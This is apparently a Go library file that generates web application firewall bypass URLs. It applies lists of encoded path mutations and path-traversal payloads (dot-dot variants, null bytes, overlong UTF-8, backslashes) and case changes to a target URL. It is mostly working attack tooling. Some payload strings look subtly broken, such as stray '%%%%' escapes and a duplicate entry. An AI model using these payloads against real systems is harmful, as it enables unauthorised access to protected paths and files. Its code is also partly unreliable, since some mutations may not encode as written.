package wafcheck

import (
	"fmt"
	"net/url"
	"strings"
)

// PathMutations contains a list of path mutations for WAF bypass
var PathMutations = []string{
	"/",
	"/%2e/",
	"//.",
	"////",
	"/.//./",
	"/.;/",
	"/%20",
	"/../",
	"/%09",
	"/%20",
	"/%%%%20",
	"/%%%%23%%%%3f",
	"/%%%%252f%%%%252f",
	"/%%%%252f/",
	"/%%%%2e%%%%2e",
	"/%%%%2e%%%%2e/",
	"/%%%%2f",
	"/%%%%2f%%%%20%%%%23",
	"/..;/",
	"/.././",
	"/;/",
	"/;foo=bar",
	"/./",
	"/.%2e/",
	"/%2e%2e/",
	"/%2e%2e%2f/",
	"/..%00/",
	"/..%01/",
	"/..//",
	"/..\\/",
	"/%5C../",
	"/%2e%2e\\",
	"/..%255c",
	"/..%255c..%255c",
	"/..%5c..%5c",
	"/.%252e/",
	"/%252e/",
	"/..%c0%af",
	"/..%c1%9c",
	"/%%32%65",
	"/%%32%65/",
	"/..%bg%qf",
	"/..%u2215",
	"/..%u2216",
	"/..0x2f",
	"/0x2e0x2e/",
	"/..%c0%ae%c0%ae/",
	"/%%c0%ae%%c0%ae/",
	"/%%32%%65%%32%%65/",
}

// MutateURL applies a path mutation to a URL for WAF bypass
func MutateURL(originalURL string, mutationIndex int) (string, error) {
	if mutationIndex < 0 || mutationIndex >= len(PathMutations) {
		return "", fmt.Errorf("invalid mutation index: %d", mutationIndex)
	}

	parsedURL, err := url.Parse(originalURL)
	if err != nil {
		return "", fmt.Errorf("invalid URL: %w", err)
	}

	// Get the path and apply mutation
	path := parsedURL.Path
	if path == "" || path == "/" {
		path = "/index.php" // Default to a common file if no path is specified
	}

	// Apply the mutation to the path
	mutation := PathMutations[mutationIndex]
	
	// Handle different mutation strategies based on the mutation pattern
	if strings.HasPrefix(mutation, "/") {
		// Replace the leading slash with the mutation
		path = mutation + path[1:]
	} else {
		// Insert the mutation after each slash
		segments := strings.Split(path, "/")
		var newPath strings.Builder
		for i, segment := range segments {
			if i > 0 {
				newPath.WriteString(mutation)
			}
			newPath.WriteString(segment)
		}
		path = newPath.String()
	}

	// Update the URL with the mutated path
	parsedURL.Path = path
	return parsedURL.String(), nil
}

// MutateURLWithAllVariants returns all possible mutations of a URL
func MutateURLWithAllVariants(originalURL string) ([]string, error) {
	var results []string

	for i := range PathMutations {
		mutated, err := MutateURL(originalURL, i)
		if err != nil {
			continue
		}
		results = append(results, mutated)
	}

	return results, nil
}

// MutatePathComponent applies a mutation to a specific path component
func MutatePathComponent(originalURL string, componentIndex int, mutationIndex int) (string, error) {
	if mutationIndex < 0 || mutationIndex >= len(PathMutations) {
		return "", fmt.Errorf("invalid mutation index: %d", mutationIndex)
	}

	parsedURL, err := url.Parse(originalURL)
	if err != nil {
		return "", fmt.Errorf("invalid URL: %w", err)
	}

	// Split the path into components
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	components := strings.Split(path, "/")
	// Remove empty components
	var filteredComponents []string
	for _, comp := range components {
		if comp != "" {
			filteredComponents = append(filteredComponents, comp)
		}
	}

	// Check if component index is valid
	if componentIndex < 0 || componentIndex >= len(filteredComponents) {
		return "", fmt.Errorf("invalid component index: %d", componentIndex)
	}

	// Apply mutation to the specified component
	mutation := PathMutations[mutationIndex]
	filteredComponents[componentIndex] = mutation + filteredComponents[componentIndex]

	// Reconstruct the path
	var newPath strings.Builder
	newPath.WriteString("/")
	for i, comp := range filteredComponents {
		newPath.WriteString(comp)
		if i < len(filteredComponents)-1 {
			newPath.WriteString("/")
		}
	}

	// Update the URL with the mutated path
	parsedURL.Path = newPath.String()
	return parsedURL.String(), nil
}

// GetPathTraversalVariants returns common path traversal variants for a given depth
func GetPathTraversalVariants(depth int) []string {
	var variants []string
	
	// Basic path traversal
	basic := "../" 
	for i := 1; i <= depth; i++ {
		traversal := strings.Repeat(basic, i)
		variants = append(variants, traversal)
	}
	
	// URL encoded variants
	urlEncoded := "%2e%2e/"
	for i := 1; i <= depth; i++ {
		traversal := strings.Repeat(urlEncoded, i)
		variants = append(variants, traversal)
	}
	
	// Double URL encoded variants
	doubleUrlEncoded := "%252e%252e/"
	for i := 1; i <= depth; i++ {
		traversal := strings.Repeat(doubleUrlEncoded, i)
		variants = append(variants, traversal)
	}
	
	// Unicode variants
	unicodeVariant := "..%u2215"
	for i := 1; i <= depth; i++ {
		traversal := strings.Repeat(unicodeVariant, i)
		variants = append(variants, traversal)
	}
	
	// Add more complex variants
	complexVariants := []string{
		"..%00/",
		"..%01/",
		"..%c0%af/",
		"..%c1%9c/",
		"..%c0%ae/",
		"..%c0%ae%c0%ae/",
		"..0x2f",
		"..\\",
		"..%5c",
		"..%255c",
		"..%bg%qf/",
	}
	
	for _, variant := range complexVariants {
		for i := 1; i <= depth; i++ {
			traversal := strings.Repeat(variant, i)
			variants = append(variants, traversal)
		}
	}
	
	return variants
}

// ApplyPathTraversalToURL applies path traversal to a URL to reach a target file
func ApplyPathTraversalToURL(baseURL, targetFile string, variant string) (string, error) {
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return "", fmt.Errorf("invalid URL: %w", err)
	}
	
	// Construct the path traversal payload
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}
	
	// Count the depth needed to reach the root
	depth := strings.Count(path, "/")
	if depth == 0 {
		depth = 1
	}
	
	// Apply the selected variant with the appropriate depth
	traversal := strings.Repeat(variant, depth)
	
	// Construct the final path
	finalPath := path + traversal + targetFile
	
	// Update the URL
	parsedURL.Path = finalPath
	return parsedURL.String(), nil
}

// GenerateWAFBypassURLs generates a set of URLs with different WAF bypass techniques
func GenerateWAFBypassURLs(originalURL string) ([]string, error) {
	var bypassURLs []string
	
	// Basic URL mutations
	mutations, err := MutateURLWithAllVariants(originalURL)
	if err == nil {
		bypassURLs = append(bypassURLs, mutations...)
	}
	
	// Path traversal variants
	parsedURL, err := url.Parse(originalURL)
	if err == nil {
		path := parsedURL.Path
		if path == "" {
			path = "/"
		}
		
		// Extract the filename or last path component
		components := strings.Split(path, "/")
		var lastComponent string
		for i := len(components) - 1; i >= 0; i-- {
			if components[i] != "" {
				lastComponent = components[i]
				break
			}
		}
		
		if lastComponent != "" {
			// Apply path traversal variants to reach the same file
			traversalVariants := GetPathTraversalVariants(3) // Try up to 3 levels deep
			for _, variant := range traversalVariants {
				traversalURL, err := ApplyPathTraversalToURL(originalURL, lastComponent, variant)
				if err == nil {
					bypassURLs = append(bypassURLs, traversalURL)
				}
			}
		}
	}
	
	// Add case variations
	parsedURL, err = url.Parse(originalURL)
	if err == nil {
		path := parsedURL.Path
		if path != "" && path != "/" {
			// Create uppercase and mixed case variations
			upperPath := strings.ToUpper(path)
			parsedURL.Path = upperPath
			bypassURLs = append(bypassURLs, parsedURL.String())
			
			// Mixed case variation
			var mixedPath strings.Builder
			for i, char := range path {
				if i%2 == 0 {
					mixedPath.WriteRune(char)
				} else {
					mixedPath.WriteString(strings.ToUpper(string(char)))
				}
			}
			parsedURL.Path = mixedPath.String()
			bypassURLs = append(bypassURLs, parsedURL.String())
		}
	}
	
	return bypassURLs, nil
}
